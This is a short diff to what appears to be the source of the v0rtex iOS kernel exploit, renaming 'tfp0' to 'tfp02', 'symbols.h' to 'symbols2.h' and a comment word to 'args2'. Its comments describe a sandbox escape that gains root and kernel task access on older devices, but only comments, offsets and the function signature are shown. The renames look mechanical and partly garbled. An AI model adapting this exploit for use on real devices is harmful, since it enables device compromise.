@@ -3,8 +3,8 @@
 // Exploit by Siguza.
 
 // Status quo:
-// - Escapes sandbox, gets root and tfp0, should work on A7-A10 devices <=10.3.3.
-// - Can call arbitrary kernel functions with up to 7 args via KCALL().
+// - Escapes sandbox, gets root and tfp02, should work on A7-A10 devices <=10.3.3.
+// - Can call arbitrary kernel functions with up to 7 args2 via KCALL().
 // - Relies on mach_zone_force_gc which was removed in iOS 11, but the same
 //   effect should be achievable by continuously spraying through zones and
 //   measuring how long it takes - garbag collection usually takes ages. :P
@@ -20,8 +20,8 @@
 #include <CoreFoundation/CoreFoundation.h>
 
 #include "common.h"
-#include "symbols.h"
-#include "symbols.h"
+#include "symbols2.h"
+#include "symbols2.h"
 
 #define SIZEOF_TASK                                 0x550
 #define OFFSET_TASK_ITK_SELF                        0xd8
@@ -431,7 +431,7 @@ typedef union
     } b;
 } ktask_t;
 
-kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide, kptr_t *kernucred, kptr_t *selfproc)
+kern_return_t v0rtex(task_t *tfp02, kptr_t *kslide, kptr_t *kernucred, kptr_t *selfproc)
 {
     kern_return_t retval = KERN_FAILURE,
     ret;
@@ -1213,7 +1213,7 @@ zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
         goto out5;
     }
     
-    *tfp0 = kernel_task;
+    *tfp02 = kernel_task;
     *kslide = slide;
     *kernucred = kern_ucred;
     *selfproc = self_proc;
